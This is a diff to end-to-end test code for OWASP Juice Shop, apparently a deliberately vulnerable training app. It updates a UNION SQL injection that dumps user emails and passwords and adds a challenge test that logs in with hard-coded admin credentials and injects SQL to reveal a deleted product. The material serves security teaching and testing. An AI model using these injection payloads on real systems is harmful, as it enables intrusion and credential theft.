@@ -30,7 +30,7 @@ describe('/#/search', function () {
     describe('challenge "unionSqlI"', function () {
 
         it('search query should be susceptible to UNION SQL injection attacks', function () {
-            searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null from users--');
+            searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null,null from users--');
             searchButton.click();
 
             var productDescriptions = element.all(by.repeater('product in products').column('description'));
@@ -38,6 +38,26 @@ describe('/#/search', function () {
         });
 
         protractor.expect.challengeSolved({challenge: 'unionSqlI'});
+
+    });
+
+    describe('challenge "christmasSpecial"', function () {
+        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});
+
+        it('search query should reveal logically deleted christmas special product on SQL injection attack', function () {
+            searchQuery.sendKeys('christmas%25\'))--');
+            searchButton.click();
+
+            var productNames = element.all(by.repeater('product in products').column('name'));
+            expect(productNames.first().getText()).toMatch(/Christmas Super-Surprise-Box \(2014 Edition\)/);
+
+            element(by.css('.fa-cart-plus')).element(by.xpath('ancestor::a')).click();
+
+            browser.get('/#/basket');
+            element(by.id('checkoutButton')).click();
+        });
+
+        protractor.expect.challengeSolved({challenge: 'christmasSpecial'});
 
     });
 
